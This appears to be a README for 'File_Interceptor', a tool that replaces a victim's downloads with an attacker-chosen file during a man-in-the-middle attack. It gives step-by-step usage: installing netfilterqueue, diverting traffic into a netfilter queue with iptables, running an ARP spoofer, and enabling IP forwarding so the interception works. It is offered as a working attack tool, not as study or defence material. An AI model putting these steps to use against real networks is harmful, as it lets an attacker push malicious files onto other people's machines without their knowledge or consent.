# File_Interceptor
File Interceptor is used to replace downloads in target when the attacker in MITM attack. You can modify the ip of attacker and download file you want to download.

Usage:
First Terminal:

pip install netfilterqueue

python replace_downloads.py

Second Terminal: Outside the Machine:

iptables -I FORWARD -j NFQUEUE --queue-num 0

Inside the machine:

iptables -I OUTPUT -j NFQUEUE --queue-num 0

iptables -I INPUT -j NFQUEUE --queue-num 0

python arp_spoofer.py

Third Terminal:

echo 1 > /proc/sys/net/ipv4/ip_forward

All Finished:

iptables --flush
